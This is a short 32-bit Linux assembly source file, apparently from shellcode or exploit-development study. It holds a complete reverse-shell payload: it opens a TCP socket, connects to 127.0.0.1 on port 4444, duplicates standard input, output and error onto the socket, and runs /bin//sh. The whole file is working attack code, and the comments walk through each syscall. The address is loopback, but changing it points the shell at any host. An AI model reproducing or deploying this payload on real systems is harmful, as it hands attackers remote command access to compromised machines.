; reverse shell
;
; system syscalls     /usr/include/i386-linux-gnu/asm/unistd_32.h
; socket syscalls     /usr/include/linux/net.h    
; socket domains      /usr/include/netinet/in.h   (Internet Address Family)
; socket types        /usr/include/i386-linux-gnu/bits/socket_type.h
; socket protocols    /usr/include/i386-linux-gnu/bits/socket.h
; socket options      /usr/include/asm-generic/socket.h


global _start

section .text

_start:

    
    ; socket
    ; int socketcall(int call, unsigned long *args);
    ; int socket(int domain, int type, int protocol);
    ;
    ; int socketcall(1, [2,1,6])

socket:
    xor eax, eax
    xor ebx, ebx
    push 6                      ; protocol = IPPROTO_IP = 6 (tcp)
    push 1                      ; type = SOCK_STREAM = 1
    push 2                      ; domain = PF_INET = 2
    mov ecx, esp                ; args = [2,1,6]
    mov bl, 1                   ; call = sys_socket = 1
    mov al, 102                 ; socketcall
    int 0x80

    mov esi, eax                ; esi == socketfd



    ; connect
    ; int socketcall(int call, unsigned long *args);
    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ;    struct sockaddr_in {
    ;        short            sin_family;   // word
    ;        unsigned short   sin_port;     // word
    ;        struct in_addr   sin_addr;     // dword (ulong)
    ;    };
    ;
    ; int socketcall(3, [sockfd, [2, 4444, 127.0.0.1], 16])

connect:
    push 0x0100007f             ; sin_addr = 127.0.0.1
    push word 0x5c11            ; sin_port = 4444
    push word 0x2               ; sin_family = PF_INET = 2
    mov ecx, esp                ; struct sockaddr *addr = [2, 4444, 127.0.0.1]
    push 16                     ; socklen_t addrlen = 16
    push ecx                    ; struct sockaddr *addr
    push esi                    ; sockfd
    mov ecx, esp                ; args = [sockfd, [2, 4444, 127.0.0.1], 16]
    mov bl, 3                   ; call = sys_connect = 3
    mov al, 102                 ; socketcall
    int 0x80

 

    ; remap i/o
    ; int dup2(int oldfd, int newfd);
    ;
    ; int dup2(clientfd, 2);
    ; int dup2(clientfd, 1);
    ; int dup2(clientfd, 0);

    xor ecx, ecx
    mov cl, 2                   ; newfd = stdin, stdout, stderr
    mov ebx, esi                ; oldfd = socketfd
    xor eax, eax
dup2:
    mov al, 63                  ; dup2
    int 0x80
    dec ecx
    jns dup2  




    ; execve
    ; int execve(const char *filename, char *const argv[], char *const envp[]);
    ;
    ; int execve("/bin//sh", &cmd, 0)

execve:
    xor eax, eax
    push eax                    ; 0
    push 0x68732f2f             ; hs//
    push 0x6e69622f             ; nib/
    mov ebx, esp                ; filename

    push eax                    ; 0
    mov edx, esp                ; envp

    push ebx                    ; filename address
    mov ecx, esp                ; argv

    mov al, 11                  ; execve
    int 0x80
